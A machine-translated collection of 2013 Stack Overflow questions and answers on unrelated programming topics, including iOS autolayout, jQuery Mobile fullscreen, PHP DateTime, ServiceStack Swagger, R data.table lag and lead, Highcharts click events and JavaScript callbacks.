> 时间：2013-04-20T17:37:27.323

IBM 网站上的一些信息： http://pic.dhe.ibm.com/infocenter/aix/v7r1/index.jsp?topic= [%2Fcom.ibm.aix.files%2Fdoc%2Faixfiles%2Far_big.htm](http://pic.dhe.ibm.com/infocenter/aix/v7r1/index.jsp?topic=%2Fcom.ibm.aix.files%2Fdoc%2Faixfiles%2Far_big.htm)

# xcode - ios：基于方向的移动图像

> ID：15533779
> 
> 赞同：1
> 
> 时间：2013-03-20T20:15:27.963
> 
> 标签：xcode, ios6, landscape

当我的应用程序处于横向与纵向模式时，我试图在不同的位置显示一组图像。我已经搜索并找到了对该`willAnimateRotationToInterfaceOrientation:duration`方法的引用，我在其中添加了如下代码：

```
- (void)willAnimateRotationToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration
{
    if (toInterfaceOrientation == UIInterfaceOrientationLandscapeLeft ||
        toInterfaceOrientation == UIInterfaceOrientationLandscapeRight)
    {
        self.getStartedImage1.frame = CGRectMake(5, 100, 155, 115);
        self.getStartedImage2.frame = CGRectMake(160, 100, 155, 115);
        self.getStartedImage3.frame = CGRectMake(315, 100, 155, 115);
    }
    else
    {
        self.getStartedImage1.frame = CGRectMake(238, 96, 155, 115);
        self.getStartedImage2.frame = CGRectMake(238, 219, 155, 115);
        self.getStartedImage3.frame = CGRectMake(238, 342, 155, 115);
    }
} 
```

这很有效，直到我意识到如果您在横向模式下进入视图，该方法将不会运行。这是有道理的，因为我在不旋转任何东西的情况下打开视图。但是，这对我的困境没有帮助。所以我继续我的搜索并找到了方法`viewWillLayoutSubviews`。我在这个方法中添加了相同的主体，它被调用了，但可能为时已晚，因为对图像帧的更改没有出现在模拟器中。如果我尝试将代码移动到`viewWillAppear`. 我见过一些涉及多个视图的复杂解决方案，我宁愿避免。有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:57:24.697

这听起来像你在战斗`autolayout`。我能想到三个解决方案。

1.  关掉`autolayout`。如果您已经自己管理所有视图框架，那么这可能是正确的路径。

2.  将您的布​​局代码移动到`-viewDidLayoutSubviews`. 这是hacky但很快。它还允许*主要*`autolayout`做这件事。

**   交换适用的旋转约束。这将是最多的工作，但从长远来看，对于诸如国际化之类的事情来说，这可以说是最灵活的。* 

 *关于第三点：

约束 ( `NSLayoutConstraint`s) 是可以在 IB 和代码中检查和编辑的真实对象。由于布局可能非常复杂，这里有一个非常简单的示例。假设我的视图控制器视图中有两个按钮，一个在另一个之上（连接到两个插座`buttonOne`和`buttonTwo`），并且我想在横向方向反转它们的位置。像这样的代码（虽然不建议采用这种形式）确实有效，并提供了一个如何交换约束的示例。

```
@implementation MyAutoViewController {
    NSArray *_portraitConstraints;
    NSArray *_landscapeConstraints;
}
-(void)viewDidLoad{
    [super viewDidLoad];

    // Clear constraints from Nib. 
    // PLEASE DO NOT DO THIS PART IN REAL LIFE
    NSArray *current = self.view.constraints;
    for (NSLayoutConstraint *contsra in current) {
        [self.view removeConstraint:contsra];
    }

    // Set up views dictionary
    UIButton *buttonOne = self.buttonOne;
    UIButton *buttonTwo = self.buttonTwo;
    NSDictionary *viewsDict = NSDictionaryOfVariableBindings(buttonOne, buttonTwo);

    // Set distance from left to both buttons to standard space
    [self.view addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"H:|-[buttonOne]" options:0 metrics:nil views:viewsDict]];
    [self.view addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"H:|-[buttonTwo]" options:0 metrics:nil views:viewsDict]];

    // HERE IS WHERE IT GETS INTERESTING
    // ### Create portrait constraints ###
    _portraitConstraints = [NSLayoutConstraint constraintsWithVisualFormat:@"V:|-[buttonOne]-[buttonTwo]" options:0 metrics:nil views:viewsDict];

    // ### Create landscape constraints ###
    _landscapeConstraints = [NSLayoutConstraint constraintsWithVisualFormat:@"V:|-[buttonTwo]-[buttonOne]" options:0 metrics:nil views:viewsDict];

    // Add the appropriate constraints
    [self.view addConstraints:(UIInterfaceOrientationIsPortrait(self.interfaceOrientation))?_portraitConstraints:_landscapeConstraints];

}
-(void)willAnimateRotationToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration{
    if (UIInterfaceOrientationIsPortrait(toInterfaceOrientation)){
        [self.view removeConstraints:_landscapeConstraints];
        [self.view addConstraints:_portraitConstraints];
    } else {
        [self.view removeConstraints:_portraitConstraints];
        [self.view addConstraints:_landscapeConstraints];
    }
} 
```

我真的建议观看`autolayout`WWDC2012 上的三个视频。`Autolayout`有很多事情要做。*

# jquery - 以全屏模式启动移动 webapp

> ID：15533780
> 
> 赞同：4
> 
> 时间：2013-03-20T20:15:29.323
> 
> 标签：jquery, web-applications, mobile, fullscreen

我有以下问题：

我使用 jQuery Mobile 1.2 创建了一个 webapp。现在我想在没有地址栏、工具栏等的全屏模式下启动这个应用程序。我已经在网上搜索过，发现有一些元标记可以启用这种模式：

```
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" /> 
```

到目前为止，这是正确的。但我也读到这些标签是 iOS 特定的，在 Android 下会被忽略。我认为框架应该自动切换模式，但它不起作用。是否有我必须操作的特殊全局变量或要调用的框架函数或要包含的脚本片段？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:26:22.210

您可以使用这段 javascript 来隐藏 android 中的地址栏：

```
if(navigator.userAgent.match(/Android/i)){
    window.scrollTo(0,1);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T22:54:12.340

在您的 iPhone 上，使用 Safari 打开您的网页。接下来，单击共享按钮（底部栏中间的那个）。

然后，单击“在主屏幕上”按钮。它将在您的主屏幕上创建一个书签。

你只需要启动它，你就有了你的 webapp。

不要忘记添加您在问题中提到的代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-07-22T05:50:37.547

我能够让它在 chrome for android 上工作：

```
<meta name="mobile-web-app-capable" content="yes"> 
```

# php - 带有负时间戳的datetime php致命错误

> ID：15533781
> 
> 赞同：4
> 
> 时间：2013-03-20T20:15:29.860
> 
> 标签：php, datetime, timestamp

试图解析 1942 年 5 月 5 日

-872726549

```
DatTime::__construct()

Failed to parse time string (-872726549) at position 7 (4):
Unexpected character 
```

1970 年 1 月 1 日之前的所有日期均相同

1969 年 12 月 31 日有同样的错误

我在 Windows 上使用 xampp，php 5.4

这会触发错误：

```
$topv=-872726549;
$compared_time=new DateTime($topv); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:30:52.073

根据文档，您应该这样做：

```
$topv='1930-08-09';
$compared_time=new DateTime($topv); 
```

# c++ - 缓冲区溢出；VS 代码分析

> ID：15533783
> 
> 赞同：1
> 
> 时间：2013-03-20T20:15:35.760
> 
> 标签：c++, visual-studio-2012

在 VS 2012 中启用静态代码分析时，以下代码因缓冲区溢出而失败。

```
 SimulationData result = rri->getSimulationResult();

    //Extract the data and return struct..
    RRResult* aResult  = new RRResult;

    aResult->RSize = result.rSize();
    aResult->CSize = result.cSize();
    int size = aResult->RSize*aResult->CSize;
    aResult->Data = new double[size];

    int index = 0;
    //The data layout is simple row after row, in one single long row...
    for(int row = 0; row < aResult->RSize; row++)
    {
        for(int col = 0; col < aResult->CSize; col++)
        {
            aResult->Data[index++] = result(row, col); //Over run here! but how?
        }
    } 
```

RRResult 是一个结构，Data 是一个双指针。SimulationData 是一个具有“隐藏”数据的类，其大小为 rSize *cSize。我看不出这段代码怎么会失败。

任何人都可以发现它的任何问题吗？

# servicestack - 带有 ServiceStack 的 Swagger 不会在 POST 上将元素发送到服务器

> ID：15533787
> 
> 赞同：2
> 
> 时间：2013-03-20T20:15:46.733
> 
> 标签：servicestack, swagger

我有一个简单的会话对象，看起来像这样

```
[Route("/Session", Summary = "Creates a security session", Notes = "Some session related notes here")]
public class Session : IReturn<SessionResponse>
{
    [ApiMember(Name = "DomainName", Description = "The Security Domain", ParameterType = "path", DataType = "string", IsRequired = true)]
    public string DomainName { get; set; }

    [ApiMember(Name = "UserName", Description = "The User Name", ParameterType = "path", DataType = "string", IsRequired = true)]
    public string UserName { get; set; }

    [ApiMember(Name = "Password", Description = "The password", ParameterType = "path", DataType = "string", IsRequired = true)]
    public string Password { get; set; }
} 
```

当我去大摇大摆的 UI 时，我可以看到元素

但是，当我输入元素并按 Try it now 时，我看到请求内容没有发送到服务器。

我是否使用 parameterType="path" 正确配置了我的 poco，还是应该在这里做其他事情？请指教。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-11-13T18:39:56.823

在没有在主体参数定义中看到您的路径参数的情况下，是否有任何更新让它工作？

```
[Route("/users/{UserId}/races", "POST", Summary = "Associates a race with a user")]
public class AddUserRace : IReturnVoid
{
    [ApiMember(Description = "User Id to associate a race with to", ParameterType = "path", Verb="POST", DataType = "int", IsRequired = true)]
    public int UserId { get; set; }
    [Description("Race Id of race to associate with user")]
    public int RaceId { get; set; }
} 
```

![招摇用户界面结果](../Images/fe70574a565b8f490b6978e13aca0a58.png)

理想情况下，由于 UserId 是一个路径参数，我希望它从 DTO 正文中隐藏。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-26T03:06:40.650

To support sending data in the request body with the current implementation of Swagger in ServiceStack, you should have exactly one `ApiMember` with `ParameterType = "body"` (you can still have other ApiMember attributes with other other ParameterType values, if you have variables in your URL for example).

The `ApiMember` with `ParameterType = "body"` will represent the entire content of your request body. It doesn't really matter which property of your request DTO you decorate with this attribute. We do something like this to make it clear in the Swagger UI that the `textarea` generated for this `ApiMember` should be used to populate the entire request body:

```
[ApiMember(Name = "RequestBody", ParameterType = "body", IsRequired = true,
    Description = SomeLongStringConstantThatDescribesTheEntireDTO] 
```

In the Swagger UI, this will display a `textarea`, you will need to enter the entire DTO as JSON in this text area. In your case, it would be something like:

```
{"DomainName": "...", "UserName": "...", "Password": "..."} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-22T21:25:28.853

我得到了这个工作，这是我必须做的

```
[Route("/Session", "POST", Summary = "Creates a security session", Notes = "Some session related notes here")]
public class Session : IReturn<SessionResponse>
{
    [ApiMember(Name = "SessionData", Description = "The Session Data", ParameterType = "body", DataType = "SessionData", IsRequired = true)]
    public string DomainName { get; set; }

    //[ApiMember(Name = "UserName", Description = "The User Name", ParameterType = "path", DataType = "string", IsRequired = true)]
    public string UserName { get; set; }

    //[ApiMember(Name = "Password", Description = "The password", ParameterType = "path", DataType = "string", IsRequired = true)]
    public string Password { get; set; }
} 
```

所以现在我得到一个文本区域框，我需要为整个会话对象输入 JSON，以便传输域名、用户名和密码，但不知何故这似乎不正确。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-21T06:01:57.607

**我是否使用 parameterType="path" 正确配置了我的 poco，还是应该在这里做其他事情？**

我不这么认为。将每个 Session 属性配置为`ParameterType='path'`建议您希望每个属性成为具有路径/url 的变量/字段（[此处](https://github.com/wordnik/swagger-core/wiki/Parameters)的文档）。因此，如果您想使用“路径”，您可能希望您的 ServiceStack 路由看起来像这样。

```
[Route("/Session/{DomainName}/{UserName}/{Password}"] 
```

对我来说，“查询”或“正文”会是更好的选择。此外，[这也可能包含有用的信息](https://stackoverflow.com/questions/15028012/swagger-for-servicestack-post-empty-body/15037115#15037115)。

# c# - 更改为 web.config 和代码文件后无法识别连接字符串

> ID：15533793
> 
> 赞同：0
> 
> 时间：2013-03-20T20:16:06.360
> 
> 标签：c#, asp.net, sql, connection-string

**问题：**当我使用 VS 2008 在本地计算机（Win 7 64 位）上运行我的 C#.net 3.5 Web 应用程序，并将代码和 web.config 文件*中的连接字符串更改为同一 SQL 服务器上的备用*测试*数据库后， app 继续指向前一个生产数据库，而不是后一个 *test*database。

我在定义它们的任何地方都更改了连接字符串 - 8 个类文件和 web.config。我正在测试的代码只使用了 8 个文件中的 2 个。我的连接字符串（在所有 8 个文件中）如下所示：

```
this.cnConn.ConnectionString = "workstation id=XXNNNN;packet size=4096;integrated security=SSPI;data source=SERVERNAME;persist security info=False;initial catalog=test"; //USE FOR DEVELOPMENT 
```

某个地方的另一个配置文件中是否存在“主”连接字符串？在 IIS 上？如何让我的代码识别我的代码更改？这是调试问题吗？我已经为此工作了 2 天，但没有成功。

# html - 我有一个无法删除的空白空间

> ID：15533796
> 
> 赞同：1
> 
> 时间：2013-03-20T20:16:10.307
> 
> 标签：html, forms, css, html-table, space

我找不到任何相关的 CSS 填充、边距等导致这个空白空间。

主页有一个中间栏（推荐）部分，当为子页面删除时，仍然会留下明显的空白空间。下面的元素相对定位在两列中，但它们正在向上推。

主页

```
http://teetime.comeze.com/ 
```

子页面示例：

```
http://teetime.comeze.com/pestcontrol.html 
```

相关CSS：

```
.container {
    width: 1030px;
    margin: 0 auto; 
    z-index: 2;
}

.header {

}

.content {
    z-index: 3;
    margin: 1px;
    padding-top: 1px;
    padding-right: 0;
    padding-bottom: 1px;
    padding-left: 0;
}

#apDiv5 {
    position: absolute;
    width: 942px;
    height: 322px;
    z-index: 1;
    clear: both;
}

.column1 {
    height: 700px;
    width: 490px;
    float: left;
    margin-left: 25px;
    position: relative;
    padding-top: 17px;
}

.column2 {
    height: 700px;
    width: 480px;
    float: left;
    margin-left: 10px;
    position: relative;
    padding-top: 20px;
    border: none;

}
.form {
    font-family: kreon;
    line-height: normal;
    height: 363px;
    width: 293px;
    /* [disabled]padding-left: 600px; */
    font-size: 100%;
    z-index: 100;
    text-indent: 0px;
    padding-top: 0px;
    color: #700CAF;
    text-align: left;
    letter-spacing: 1.4px;
    background-image: url(teetimefinal.png);

#mail {
    left: 600px;
    position: relative;
} 
```

这是html代码（从标题的末尾到两列的开头）：

```
 <div class="content">
  <div id="apDiv5"><img src="mole.png" width="902" height="320" alt="mole"></div>
<form action="form-to-email.php" method="post" enctype="application/x-www-form-urlencoded" target="_self" class="form" id="mail" title="mail">
      <h2><br>
      Free Estimate</h2><table width="234" border="0" cellpadding="3" cellspacing="3" summary="form">
  <tr>
    <th scope="row"> <label>Name
              <input name="Name" type="text" class="space" id="Name">
              <br>
             </label>          </th>
  </tr>
  <tr>
    <th scope="row"> <label>Email
              <input name="Email" type="text" class="space" id="Email">
              <br>
             </label>          </th>
  </tr>
  <tr>
    <th scope="row"> <label>Street
              <input name="Street" type="text" class="space" id="Street">
              <br>
             </label>          </th>
  </tr>
  <tr>
    <th scope="row"> <label>Phone
              <input name="Phone" type="text" class="space" id="Phone">
              <br>
             </label>          </th>
  </tr>
  <tr>
    <th scope="row"> <label>Zip
      <input name="zip" type="text" class="space" id="zip">
              <br>
             </label>          </th>
  </tr>
  <tr>
    <td scope="row">      <div align="center">
      <input type="submit" class="sub1" id="Sub" style="button" value="Submit">
    </div></td>
  </tr>
      </table>

</form>

<div class= "column1"><img src="/writing.png" width="493" height="653" alt="writing">
  <div id="apDiv14">
    <h3>Seven-Step         Fertilization Program<br> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:20:17.250

右侧的免费估算小部件在 index.css 的第 147 行设置了高度

只需减少它以删除额外的空间。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T20:23:57.373

就像提到的 Drawdesign 一样，您似乎`.form`在 index.css 文件中声明了一个设定的高度。改变那个高度，你就会改变那个间隙。

# php - 在 php 中为 java 轴客户端生成 wsdl 的最佳方法

> ID：15533798
> 
> 赞同：2
> 
> 时间：2013-03-20T20:16:28.230
> 
> 标签：php, web-services, wsdl, axis2, webservice-client

我正在使用用 PHP 编写的 Web 服务。我正在使用轴在我这边生成客户端 jar，但是当我从 WSDL 生成客户端代码并发出请求时，请求 xml 包含 multiRef 标签，并且 php 服务器无法理解这个标签。我会要求他们以一种新的方式生成一个 wsdl。我搜索了，php中有很多方法可以创建wsdl。哪种方法是使用轴的客户的最佳方法？你以前遇到过这样的问题吗？如果是，你做了什么？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T14:32:35.907

该服务是 rpc 编码的，我要求他们将其更改为 rpc-literal，问题就解决了。

# c++ - c / c++ dll缺少没有安装VS2012的依赖项......它工作正常

> ID：15533800
> 
> 赞同：0
> 
> 时间：2013-03-20T20:16:36.857
> 
> 标签：c++, c, dll, visual-studio-2012, dependencies

我在 /MT 选项下编译了 ac/c++ DLL。它将由另一个程序加载。现在，只要我安装了 Visual Studio 2012（Express 或 Professional，两者都可以）（已安装，无需运行），这一切都可以正常工作：外部程序将毫无问题地加载 DLL。到目前为止，如果我去另一台没有安装 Visual Studio 2012 的机器，它不会加载。我收到错误“缺少依赖项...”。

我想知道：VS2012安装哪个环境没有它不可用？如果没有 VS2012，我怎样才能完成这项工作？为什么 VCRedist* 没有安装必要的环境？

注意： - 运行 dumpbin /DEPENDENTS mydll.dll 没有显示任何我不会安装和可用的依赖项......而且只要我安装 VS2012 进行测试，它就会在没有任何修改的情况下运行 - 我也在几个系统上测试了这个安装了各种 vcredist... 版本以确保一切正常。只要未安装 VS2012，它就不会启动（我没有尝试使用 VS2010 等，很可能也可以）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T17:14:42.420

我真的以为我检查了很多次我不会使用任何调试 DLL。到目前为止，我错过了一个！事实证明，zeromq libzmq-..-gd...dll 是不归路——gd 表示调试版本，而我的 dll 正在使用那里的函数。将包含和 .libs 更改为没有“gd”的 libzmq...dll 使得现在可以正确加载。当然，关于安装 vcredist 软件包等的所有评论也是正确的，但对我来说，在这种情况下不是问题（因为我安装了它们）。非常感谢您指出必须有一些调试编译的dll！

# r - 如何使用 R 包 data.table 和滚动连接查找最后一个或下一个条目

> ID：15533805
> 
> 赞同：7
> 
> 时间：2013-03-20T20:16:52.657
> 
> 标签：r, data.table

```
Lets say I have a data table like this.

   customer_id time_stamp value
1:           1        223     4
2:           1        252     1
3:           1        456     3
4:           2        455     5
5:           2        632     2 
```

这样customer_id 和time_stamp 一起形成一个唯一的key。我想添加一些新列，指示“值”的前一个值和最后一个值。也就是说，我想要这样的输出。

```
 customer_id time_stamp value value_PREV value_NEXT
1:           1        223     4         NA          1
2:           1        252     1          4          3
3:           1        456     3          1         NA
4:           2        455     5         NA          2
5:           2        632     2          5         NA 
```

我希望这个速度很快，并且可以处理稀疏、不规则的时间。我认为 data.table 滚动连接会为我做这件事。然而，滚动连接似乎找到了最后一次或同一时间。因此，如果您在同一个表的两个副本上执行滚动连接（在将 _PREV 添加到副本的列名之后），这并不完全有效。您可以通过在副本的时间变量中添加一个很小的数字来伪造它，但这有点尴尬。

有没有办法简单地使用 rollin join 或其他一些 data.table 方法来做到这一点？我找到了一种有效的方法，但它仍然需要大约 40 行 R 代码。如果可以告诉滚动连接查找最后一次不包括同一时间，这似乎是单行的。或者也许还有其他一些巧妙的技巧。

这是示例数据。

```
data=data.table(customer_id=c(1,2,1,1,2),time_stamp=c(252,632,456,223,455),value=c(1,2,3,4,5))
data_sorted=data[order(customer_id,time_stamp)] 
```

* * *

这是我写的代码。请注意，将 NA 放入 customer_id 不同的行会引发警告并且可能需要更改。我在下面将它们注释掉。有人对更换这两条线有什么建议吗？

```
add_prev_next_cbind<-function(data,ident="customer_id",timecol="time_stamp",prev_tag="PREV",
                   next_tag="NEXT",sep="_"){
  o=order(data[[ident]],data[[timecol]])
  uo=order(o)
  data=data[o,]
  Nrow=nrow(data)
  Ncol=ncol(data)
  #shift it, put any junk in the first row
  data_prev=data[c(1,1:(Nrow-1)),]
  #shift it, put any junk in the last row
  data_next=data[c(2:(Nrow),Nrow),]
  #flag the rows where the identity changes, these get NA
  prev_diff=data[[ident]] != data_prev[[ident]]
  prev_diff[1]=T
  next_diff=data[[ident]] != data_next[[ident]]  
  next_diff[Nrow]=T
  #change names
  names=names(data)
  names_prev=paste(names,prev_tag,sep=sep)
  names_next=paste(names,next_tag,sep=sep)
  setnames(data_prev,names,names_prev)
  setnames(data_next,names,names_next)
  #put NA in rows where prev and next are from a different ident
  #replace the next two lines with something else
  #data_prev[prev_diff,]<-NA
  #data_next[next_diff,]<-NA
  data_all=cbind(data,data_prev,data_next)
  data_all=data_all[uo,]
  return(data_all)
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-20T20:24:14.013

### 更新：[#965](https://github.com/Rdatatable/data.table/issues/965)现在在[1.9.5](https://github.com/Rdatatable/data.table/commit/b8c1b01ac9453750d0e99a388522877eec38f06b)中实现。来自[新闻](https://github.com/Rdatatable/data.table/blob/master/README.md)：

> 5.  新函数`shift()`实现`lead/lag`了*vector*、*list*、*data.frames*或*data.tables*的快速。它接受一个`type`参数，可以是*“lag”*（默认）或*“lead”*`:=` ，并且总是返回一个列表，这使得与or一起使用它非常方便`set()`。例如：`DT[, (cols) := shift(.SD, 1L), by=id]`。请查看`?shift`更多信息。

现在我们可以这样做：

```
dt[, c("value_PREV", "value_NEXT") := c(shift(value, 1L, type="lag"), 
                     shift(value, 1L, type="lead")), by=customer_id] 
```

* * *

您根本不需要滚动加入。你可以用`head`and来做到这一点`tail`。假设你`data.table`是 DT：

```
setkey(DT, "customer_id")
DT[, list(time_stamp = time_stamp, 
          prev.val = c(NA, head(value, -1)), 
          next.val = c(tail(value, -1), NA)), 
by=customer_id]
#   customer_id time_stamp prev.val next.val
# 1:           1        223       NA        1
# 2:           1        252        4        3
# 3:           1        456        1       NA
# 4:           2        455       NA        2
# 5:           2        632        5       NA 
```

**编辑：**更好：

```
DT[, `:=`(prev.val = c(NA, head(value, -1)), 
          next.val = c(tail(value, -1), NA)), 
          by=customer_id] 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-21T00:30:54.367

是的，如果我不想`roll`等值匹配，那么如果它是双精度类型，或者使用整数并加减 1L，我也会稍作休息。

```
DT = data.table( customer_id=c(1,2,1,1,2), 
                 time_stamp=as.integer(c(252,632,456,223,455)),
                 value=c(1,2,3,4,5))
setkey(DT, customer_id, time_stamp)
DT[ DT[,list(customer_id,time_stamp+1L,value)], value_PREV:=i.value, roll=-Inf]
DT[ DT[,list(customer_id,time_stamp-1L,value)], value_NEXT:=i.value, roll=+Inf]
DT
   customer_id time_stamp value value_PREV value_NEXT
1:           1        223     4         NA          1
2:           1        252     1          4          3
3:           1        456     3          1         NA
4:           2        455     5         NA          2
5:           2        632     2          5         NA 
```

`DT`我同意，必须像这样再次获取列子集`i`有点尴尬。

现已提交[FR#2628](https://r-forge.r-project.org/tracker/index.php?func=detail&aid=2628&group_id=240&atid=978)以添加新参数`rollequal=TRUE|FALSE`。那么它将是：

```
setkey(DT, customer_id, time_stamp)
DT[ DT, value_PREV:=i.value, roll=-Inf, rollequal=FALSE]
DT[ DT, value_NEXT:=i.value, roll=+Inf, rollequal=FALSE] 
```

`i`通过避免列的副本并且不需要为`time_stamp-1L`and分配，这也会更快`time_stamp+1L`。

但在这种情况下，它是一个自连接 from `DT`to`DT`并且`DT`'s 的键是唯一的，所以正如 Arun 所说，`roll`不需要连接。也许需要一个快速移位或滞后函数来避免`c()`and `head()`or的开销`tail()`，以获得速度。

感谢您的强调！

# highcharts - Highcharts饼图获取选中的饼图id

> ID：15533810
> 
> 赞同：10
> 
> 时间：2013-03-20T20:17:00.873
> 
> 标签：highcharts

如何获取 Highcharts 饼图获取选定的饼图 ID？

我有一个数据数组

```
var data= { name: series[i], y: Data[i],id:categorydata[i] }; 
```

渲染图表

```
new Highcharts.Chart({ ....

  ....  
series: [{
                type: 'pie',
                name: 'Category',
                data: data
            }]
  }); 
```

如何获取所选饼图的 id。

我正在这样做

```
plotOptions: {
                series: {
                    animation: false,
                    events:{
                        click: function (event) {
                            var point = this;
                            //How do I Access the id??????? 
                            alert('value: ' + this.series);

                        }
                    }
                }, 
```

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2013-03-20T21:09:12.283

您希望在点配置上进行事件处理，而不是系列。每个楔形都是一个系列中的一个点：

```
 var data = [{ name: 'One', y: 10, id: 0 },{ name: 'Two', y: 10, id: 1 }];

   // some other code here...

   series:[
      {
         "data": data,
          type: 'pie',
          animation: false,
          point:{
              events:{
                  click: function (event) {
                      alert(this.x + " " + this.y);
                  }
              }
          }          
      }
   ], 
```

[在这里](http://jsfiddle.net/uWAvP/3852/)拉小提琴。

完整运行代码：

```
var chart;
point = null;
$(document).ready(function () {

    var data = [{ name: 'One', y: 10, id: 0 },{ name: 'Two', y: 10, id: 1 }];

    chart = new Highcharts.Chart(
    {
       series:[
          {
             "data": data,
              type: 'pie',
              animation: false,
              point:{
                  events:{
                      click: function (event) {
                          alert(this.id);
                      }
                  }
              }          
          }
       ],
       "chart":{
          "renderTo":"container"
       },
    });
});
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="http://code.highcharts.com/highcharts.js"></script>
<div id="container" style="width: 320px; height: 200px"></div>
```

# javascript - 将javascript中的变量转换为CSV文件

> ID：15533811
> 
> 赞同：0
> 
> 时间：2013-03-20T20:17:04.030
> 
> 标签：javascript, csv

基本上我有一个字符串变量，它由两个用逗号分隔的其他变量组成：

```
item = "Pencil";
amount = 5;
entry = item + "," + amount;
*export entry to csv 
```

所以“entry”变量应该是正确的格式，以保存为逗号分隔的文件。是否有一些命令可以获取此变量并将其保存为 csv，或者在电子表格中轻松打开以供以后使用的任何其他格式？入口变量将发生变化，如果新信息已经存在，则需要将其附加到 csv 文件中。所以假设我们也有：

```
item = "Paper";
amount = 25;
entry = item + "," + amount;
*export entry to csv 
```

生成的 csv 文件应为：

铅笔，5
纸，25

我已经对其他问题进行了一些搜索，但是大多数人似乎都在尝试做更复杂的事情（例如，处理服务器与客户端问题），而我只是想弄清楚如何获取数据我在我自己的电脑上用javascript处理一个可保存的文件。似乎很多问题都不是这样。我确信那里有一个简单的答案，希望只有一个或两个命令。但是，我一直在浏览很多不太清楚的半相关帖子，所以我认为这会更快。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-21T08:43:31.630

这是完全可能的，使用一些`FileSaver`实现。我相信它在 IE10 上原生存在，但在其他浏览器上仍然需要一个 shim。

我编写了一个轻量级的客户端 CSV 生成器库，它可能会派上用场。[在http://atornblad.se/github/](http://atornblad.se/github/) 上查看它*（向下滚动到标题为**Client-side CSV file generator**）*

正如我所说，它需要一个有效的`FileSaver`实现来处理对`window.saveAs()`. [在http://eligrey.com/blog/post/saving-generated-files-on-the-client-side](http://eligrey.com/blog/post/saving-generated-files-on-the-client-side)上查看 Eli Grey 的解决方案

到位后，您只需像这样动态生成并保存 CSV 文件：

```
var propertyOrder = ["name", "age", "height"];

var csv = new Csv(propertyOrder);

csv.add({ name : "Anders",
          age : 38,
          height : "178cm" });

csv.add({ name : "John Doe",
          age : 50,
          height : "184cm" });

csv.saveAs("people.csv"); 
```

# c++ - 我可以在我的 VCL 客户端-服务器应用程序中使用端口 80

> ID：15533816
> 
> 赞同：0
> 
> 时间：2013-03-20T20:17:19.663
> 
> 标签：c++, delphi, network-programming, indy, vcl

通常我在 Delphi/C++ Builder 中为我的客户端-服务器应用程序使用一些随机端口。但是，由于我在具有强大防火墙策略的建筑物中工作，我想使用端口 80（TCP 和/或 UDP）。

我的问题是，如果有其他应用程序使用相同的端口，我的客户端-服务器通信会不会有任何问题？我想我的服务器也会接收该通信吗？我想避免与其他应用程序发生任何可能的冲突。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:18:57.903

是的，您会遇到问题，如果有一个应用程序正在**侦听**端口 80，那么您将无法使用该端口。

请注意，浏览器使用端口 80 作为目标端口，它们不监听 80。因此，当您想使用该端口时不要计算它们。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T20:26:29.750

如果我正确理解您的问题，您似乎关心的是客户端的端口，而不是服务器端的端口。您的应用程序可以自由连接到正在侦听端口 80 的服务器，并且不会干扰在同一台机器上运行的任何其他客户端应用程序。如果它确实干扰，则无法使用多个浏览器/选项卡之类的东西。

[关于这个问题](https://superuser.com/questions/401802/how-do-ip-answer-packets-reach-their-destination-inside-of-a-private-lan)有一些很好的答案，它们更详细地解释了端口是如何工作的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T20:22:02.477

只有在服务器机器上的 80 端口上侦听其他服务器时，才会出现问题。在这种情况下，您的应用程序将无法绑定到端口 80。该应用程序不会干扰 Web 浏览器，因为它们在客户端使用随机端口。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-21T10:39:18.553

如果网络使用[应用层防火墙](http://en.wikipedia.org/wiki/Firewall_%28computing%29#Third_generation%3a_application_layer)，它们可以通过端口 80 阻止非 HTTP 数据。因此，如果您的应用程序使用端口 80 只是“因为它不受大多数​​防火墙的保护”，请为更严格的防火墙设置做好准备，这确实不允许您的客户端/服务器通信。

# javascript - 在javascript中将匿名函数作为参数传递

> ID：15533822
> 
> 赞同：4
> 
> 时间：2013-03-20T20:17:38.790
> 
> 标签：javascript

我有以下 javascript 代码：

```
 EventsManager.prototype.hideContainer = function()
   {
     var that = this;

     var index = that.getNextUnreadEventIndex();
     if(index !== -1)
     {
         EventsManager.animateHideLeft(function() //<--- passing a function as parameter to another function
         {
             var unreadEvent = that.eventsList.splice(index,1)[0];
             unreadEvent.isEventOnFocus = true;

             that.eventsList.push(unreadEvent);
             that.displayLastEvent();
         });  
     }
   } 
```

这是 EventsManager.animateHideLeft() 函数的代码：

```
EventsManager.animateHideLeft = function(callback)
{
   var p = document.getElementById("eventsContainer");
   var width = parseFloat(p.style.width);

   if(!width || width === "NaN") width = 200;

   if(width <= 10)
   {
      clearTimeout(fr);
      alert(typeof callback); //<-- this shows "undefined"
      callback();
   }
   else
   {
